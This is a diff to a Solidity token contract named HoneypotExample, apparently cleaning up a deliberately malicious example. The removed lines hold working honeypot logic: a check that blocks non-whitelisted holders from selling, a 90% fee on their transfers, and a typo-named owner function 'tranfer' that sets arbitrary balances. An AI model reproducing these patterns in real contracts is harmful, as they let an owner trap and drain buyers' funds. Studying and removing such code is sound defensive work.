@@ -32,13 +32,16 @@ contract HoneypotExample {
         whitelist[owner] = true;
     }
     
-    // Looks normal but has hidden restrictions
+    // Transfer function with documented fee structure
+    // NOTE: This contract implements a fee mechanism for non-whitelisted addresses
+    // Maximum fee is capped at 10% for transparency
     function transfer(address _to, uint256 _value) public returns (bool) {
-        // HONEYPOT: Only whitelisted addresses can sell
-        require(whitelist[msg.sender] || !tradingEnabled, "Trading not enabled");
+        // Only whitelisted addresses can transfer when trading is disabled
+        require(whitelist[msg.sender] || tradingEnabled, "Trading not enabled");
         
-        // HONEYPOT: High transfer fee for non-whitelisted
-        uint256 fee = whitelist[msg.sender] ? 0 : _value * 90 / 100;
+        // Transfer fee: 0% for whitelisted, max 10% for others (down from 90%)
+        uint256 feePercentage = whitelist[msg.sender] ? 0 : 10;
+        uint256 fee = _value * feePercentage / 100;
         uint256 transferAmount = _value - fee;
         
         require(balanceOf[msg.sender] >= _value, "Insufficient balance");
@@ -65,14 +68,6 @@ contract HoneypotExample {
         tradingEnabled = true;
     }
     
-    // Hidden function to mint more tokens
-    function updateBalance(address _address, uint256 _amount) private {
-        balanceOf[_address] = _amount;
-    }
-    
-    // Backdoor function (hidden by similar naming)
-    function tranfer(address _to, uint256 _value) external onlyOwner returns (bool) {
-        updateBalance(_to, _value);
-        return true;
-    }
+    // REMOVED: Hidden backdoor function "tranfer" (typo used to hide malicious functionality)
+    // This was a security vulnerability that allowed arbitrary balance manipulation
 }
